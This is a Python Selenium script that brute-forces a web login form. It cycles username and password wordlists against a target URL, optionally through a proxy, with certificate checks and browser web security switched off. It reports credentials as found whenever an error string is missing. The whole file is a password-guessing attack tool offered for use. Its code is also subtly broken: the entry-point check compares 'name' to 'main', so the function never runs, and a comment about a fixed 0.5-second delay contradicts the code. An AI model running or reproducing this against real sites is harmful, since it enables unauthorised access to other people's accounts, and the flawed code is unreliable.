import time
import argparse
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from selenium.common.exceptions import WebDriverException, NoSuchElementException
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
 
def main():
    parser = argparse.ArgumentParser(description="Automated login script using Selenium")
    parser.add_argument('-u', '--username', type=str, help="Username for login")
    parser.add_argument('-p', '--password', type=str, help="Password for login")
    parser.add_argument('-U', '--userlist', type=str, help="Path to username wordlist")
    parser.add_argument('-P', '--passlist', type=str, help="Path to password wordlist")
    parser.add_argument('--proxy', type=str, help="Proxy URL and port")
    parser.add_argument('-t', '--target', type=str, required=True, help="Target URL for login")
    parser.add_argument('-s', '--sleep-time', type=int, default=3000, help="Sleep time in milliseconds")
    parser.add_argument('--chromedriver-path', type=str, default='chromedriver', help="Path to the chromedriver executable")
    parser.add_argument('--wrong-creds', type=str, help="String indicating wrong credentials message")
 
    args = parser.parse_args()
 
    if not (args.password or args.passlist):
        parser.error("Either -p or -P must be specified.")
 
    print("Debug: Parsed arguments successfully")
 
    # Convert sleep time from milliseconds to seconds
    sleep_time = args.sleep_time / 1000.0
    print(f"Debug: Sleep time set to {sleep_time} seconds")
 
    chrome_options = Options()
    chrome_options.add_argument('--ignore-certificate-errors')
    chrome_options.add_argument('--ignore-ssl-errors')
    chrome_options.add_argument('--allow-insecure-localhost')
    chrome_options.add_argument('--disable-web-security')
    # chrome_options.add_argument('--headless')  # Uncomment if you want to run Chrome in headless mode
    # chrome_options.add_argument('--disable-gpu')  # Uncomment if you are using Windows and run into issues
 
    if args.proxy:
        chrome_options.add_argument('--proxy-server=%s' % args.proxy)
        print(f"Debug: Using proxy {args.proxy}")
 
    # Create a new Selenium WebDriver instance
    print("Debug: Initializing WebDriver")
    try:
        service = Service(args.chromedriver_path)
        driver = webdriver.Chrome(service=service, options=chrome_options)
        print(f"Debug: Navigating to {args.target}")
        driver.get(args.target)
    except WebDriverException as e:
        print(f"Error: Could not initialize WebDriver. {e}")
        return
 
    print(f"Debug: Sleeping for {sleep_time} seconds")
    time.sleep(sleep_time)
 
    usernames = []
    if args.username:
        print(f"Debug: Using single username {args.username}")
        usernames = [args.username]
    elif args.userlist:
        print(f"Debug: Reading usernames from {args.userlist}")
        with open(args.userlist) as f:
            usernames = f.read().splitlines()
 
    if args.password:
        print(f"Debug: Using single password {args.password}")
        passwords = [args.password]
    else:
        print(f"Debug: Reading passwords from {args.passlist}")
        with open(args.passlist) as f:
            passwords = f.read().splitlines()
 
    if args.wrong_creds:
        print(f"Debug: Wrong credentials message set to '{args.wrong_creds}'")
 
    if usernames:
        for user in usernames:
            print(f"Debug: Trying username {user}")
            username_field = driver.find_element(By.XPATH, "//input[@name='username']")
            username_field.clear()
            username_field.send_keys(user)
            for pwd in passwords:
                print(f"Debug: Trying password {pwd}")
                password_field = driver.find_element(By.XPATH, "//input[@name='token']")
                password_field.clear()
                password_field.send_keys(pwd)
                
                login_button = driver.find_element(By.XPATH, "//button[text()='Log In']")
                login_button.click()
                
                time.sleep(sleep_time)  # Wait briefly for page to respond
 
                try:
                    error_message = driver.find_element(By.XPATH, f"//*[contains(text(), '{args.wrong_creds}')]")
                    print(f"Debug: Wrong credentials for username '{user}' and password '{pwd}'")
                except NoSuchElementException:
                    print(f"Debug: Correct credentials found - Username: '{user}', Password: '{pwd}'")
                
                print("Debug: Sleeping for 0.5 seconds before next attempt")
                time.sleep(sleep_time)
    else:
        print("Debug: No usernames provided, performing brute force on passwords only")
        for pwd in passwords:
            print(f"Debug: Trying password {pwd}")
            password_field = driver.find_element(By.XPATH, "//input[@name='token']")
            password_field.clear()
            password_field.send_keys(pwd)
            
            login_button = driver.find_element(By.XPATH, "//button[text()='Log In']")
            login_button.click()
            
            time.sleep(sleep_time)  # Wait briefly for page to respond
 
            try:
                error_message = driver.find_element(By.XPATH, f"//*[contains(text(), '{args.wrong_creds}')]")
                print(f"Debug: Wrong credentials for password '{pwd}'")
            except NoSuchElementException:
                print(f"Debug: Correct credentials found - Password: '{pwd}'")
            
            print("Debug: Sleeping for 0.5 seconds before next attempt")
            time.sleep(sleep_time)
 
    # Close the Selenium WebDriver instance
    print("Debug: Closing WebDriver")
    driver.quit()
 
if name == "main":
    main()
